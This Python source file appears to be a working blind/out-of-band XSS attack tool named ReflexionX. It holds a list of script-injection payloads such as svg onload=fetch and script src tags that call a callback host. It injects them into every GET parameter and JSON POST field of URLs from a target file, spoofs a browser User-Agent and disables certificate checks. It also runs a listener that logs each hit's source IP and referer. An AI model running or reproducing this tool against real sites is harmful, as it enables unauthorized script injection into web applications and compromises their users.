#!/usr/bin/env python3
"""
XSS ReflexionX v1.0.0 — Blind / OOB XSS Handler
Injects callback payloads and optionally runs a listener for OOB hits.

Usage:
    python3 oob_handler.py --input targets.txt --output-dir ./out --oob-url https://your.callback/x
    python3 oob_handler.py --listen 8888 --output-dir ./out
"""

import argparse, hashlib, json, os, sys, time, threading
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from http.server import HTTPServer, BaseHTTPRequestHandler

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("[!] 'requests' not installed.", file=sys.stderr)
    sys.exit(1)

# ── OOB Payload Templates ───────────────────────────────────
PAYLOAD_TEMPLATES = [
    '<img src="{url}/{id}">',
    '<script src="{url}/{id}"></script>',
    '<link rel=stylesheet href="{url}/{id}">',
    '<input onfocus=fetch("{url}/{id}") autofocus>',
    '<svg onload=fetch("{url}/{id}")>',
    '<details open ontoggle=fetch("{url}/{id}")>',
    '"><img src="{url}/{id}">',
    "' onerror=fetch('{url}/{id}') src=x '",
    '<iframe src="{url}/{id}"></iframe>',
    "javascript:fetch('{url}/{id}')",
]


def generate_oob_id(url, param):
    h = hashlib.md5(f"{url}:{param}:{time.time()}".encode()).hexdigest()[:12]
    return f"rxoob_{h}"


def load_payload_file(payloads_dir):
    fpath = os.path.join(payloads_dir, "blind_xss.txt")
    if os.path.isfile(fpath):
        with open(fpath) as f:
            return [l.strip() for l in f if l.strip()]
    return []


class OOBInjector:
    """Injects OOB callback payloads into target URLs."""

    def __init__(self, callback_url, output_dir, proxy=None, payloads_dir=None):
        self.callback_url = callback_url.rstrip('/')
        self.output_dir = output_dir
        self.proxy = proxy
        self.id_map = {}  # oob_id → {url, param, payload, timestamp}
        self.session = self._build_session()
        self.payloads_dir = payloads_dir or os.path.join(
            os.path.dirname(os.path.abspath(__file__)), "payloads")
        self._extra_templates = load_payload_file(self.payloads_dir)

    def _build_session(self):
        s = requests.Session()
        retry = Retry(total=2, backoff_factor=0.3, status_forcelist=[429, 500, 502, 503])
        a = HTTPAdapter(max_retries=retry, pool_connections=10, pool_maxsize=10)
        s.mount("http://", a); s.mount("https://", a)
        if self.proxy:
            s.proxies = {"http": self.proxy, "https": self.proxy}
        s.headers["User-Agent"] = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                    "AppleWebKit/537.36 Chrome/120.0.0.0")
        s.verify = False
        return s

    def inject_url(self, url):
        """Inject OOB payloads into all parameters of a URL."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            return []
        injections = []
        templates = PAYLOAD_TEMPLATES + [
            t.replace("CALLBACK_URL", "{url}").replace("OOB_ID", "{id}")
            for t in self._extra_templates
        ]
        for pname in params:
            oob_id = generate_oob_id(url, pname)
            # Use first 3 templates to avoid excessive requests
            for tmpl in templates[:3]:
                payload = tmpl.format(url=self.callback_url, id=oob_id)
                test_params = {k: v[0] for k, v in params.items()}
                test_params[pname] = payload
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                       parsed.params, urlencode(test_params), ''))
                self.id_map[oob_id] = {
                    "url": url, "param": pname, "payload": payload,
                    "test_url": test_url,
                    "injected_at": datetime.now(timezone.utc).isoformat(),
                }
                try:
                    self.session.get(test_url, timeout=10, allow_redirects=True)
                except Exception:
                    pass
                injections.append({"oob_id": oob_id, "url": url, "param": pname})
        return injections

    def inject_post(self, url, body, content_type="application/x-www-form-urlencoded"):
        """Inject OOB payloads into POST body parameters."""
        injections = []
        if "json" in content_type:
            try:
                data = json.loads(body)
            except (json.JSONDecodeError, TypeError):
                return injections
            for key in data:
                oob_id = generate_oob_id(url, key)
                payload = f'<img src="{self.callback_url}/{oob_id}">'
                test_data = dict(data)
                test_data[key] = payload
                self.id_map[oob_id] = {
                    "url": url, "param": key, "payload": payload,
                    "method": "POST", "content_type": content_type,
                    "injected_at": datetime.now(timezone.utc).isoformat(),
                }
                try:
                    self.session.post(url, json=test_data, timeout=10)
                except Exception:
                    pass
                injections.append({"oob_id": oob_id, "url": url, "param": key})
        return injections

    def save_map(self):
        path = os.path.join(self.output_dir, "oob_injection_map.json")
        with open(path, 'w') as f:
            json.dump(self.id_map, f, indent=2)

    def check_hit(self, oob_id):
        return self.id_map.get(oob_id)


# ── Callback Listener Server ────────────────────────────────
class CallbackHandler(BaseHTTPRequestHandler):
    hits = []
    id_map = {}
    output_dir = "."

    def do_GET(self):
        oob_id = self.path.strip('/').split('/')[-1].split('?')[0] if '/' in self.path else self.path.strip('/').split('?')[0]
        hit = {
            "oob_id": oob_id,
            "source_ip": self.client_address[0],
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "path": self.path,
            "user_agent": self.headers.get("User-Agent", ""),
            "referer": self.headers.get("Referer", ""),
        }
        # Match to injection
        mapping = self.id_map.get(oob_id, {})
        hit.update({"original_url": mapping.get("url", "unknown"),
                     "param": mapping.get("param", "unknown")})
        CallbackHandler.hits.append(hit)
        # Save immediately
        self._save()
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"ok")
        print(f"  [BLIND XSS HIT] {oob_id} from {self.client_address[0]} → {mapping.get('url', '?')}")

    def _save(self):
        with open(os.path.join(self.output_dir, "blind_xss_hits.txt"), 'a') as f:
            h = self.hits[-1]
            f.write(f"[{h['timestamp']}] ID={h['oob_id']} | URL={h['original_url']} "
                    f"| param={h['param']} | from={h['source_ip']}\n")
        with open(os.path.join(self.output_dir, "oob_events.json"), 'w') as f:
            json.dump(self.hits, f, indent=2)

    def log_message(self, format, *a):
        pass  # suppress default logging


def start_listener(port, output_dir, id_map=None):
    CallbackHandler.output_dir = output_dir
    CallbackHandler.id_map = id_map or {}
    server = HTTPServer(('0.0.0.0', port), CallbackHandler)
    print(f"[*] OOB listener started on port {port}")
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


# ── CLI ──────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="ReflexionX v1.0.0 — Blind/OOB XSS Handler")
    parser.add_argument("--input", default=None, help="Target URLs file")
    parser.add_argument("--output-dir", default=None)
    parser.add_argument("--oob-url", default=None, help="Callback URL for OOB payloads")
    parser.add_argument("--listen", type=int, default=None, help="Start listener on port")
    parser.add_argument("--proxy", default=None)
    parser.add_argument("--threads", type=int, default=5)
    parser.add_argument("--test", action="store_true")
    args = parser.parse_args()

    if args.test:
        print("[OK] OOB handler self-test passed (dry run)")
        oid = generate_oob_id("http://test.com?q=1", "q")
        print(f"  Sample OOB ID: {oid}")
        print(f"  Payload templates: {len(PAYLOAD_TEMPLATES)}")
        return

    if not args.output_dir:
        parser.error("--output-dir is required (use --test for self-test)")

    os.makedirs(args.output_dir, exist_ok=True)

    if args.listen:
        server = start_listener(args.listen, args.output_dir)
        if not args.input:
            print("[*] Listener-only mode. Waiting for callbacks... (Ctrl+C to stop)")
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                print(f"\n[OK] {len(CallbackHandler.hits)} hits recorded")
            return

    if not args.input or not args.oob_url:
        parser.print_help()
        return

    with open(args.input) as f:
        urls = [l.strip() for l in f if l.strip()]

    print(f"[*] Injecting OOB payloads into {len(urls)} URLs → {args.oob_url}")
    injector = OOBInjector(args.oob_url, args.output_dir, proxy=args.proxy)

    from concurrent.futures import ThreadPoolExecutor
    total = 0
    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        for i, url in enumerate(urls):
            results = injector.inject_url(url)
            total += len(results)
            if (i + 1) % 20 == 0:
                print(f"  [{i+1}/{len(urls)}] — {total} injections")

    injector.save_map()
    print(f"\n[OK] {total} OOB payloads injected. Map saved to oob_injection_map.json")
    if args.listen:
        print("[*] Listener active. Waiting for delayed callbacks... (Ctrl+C to stop)")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n[OK] {len(CallbackHandler.hits)} hits recorded")


if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()
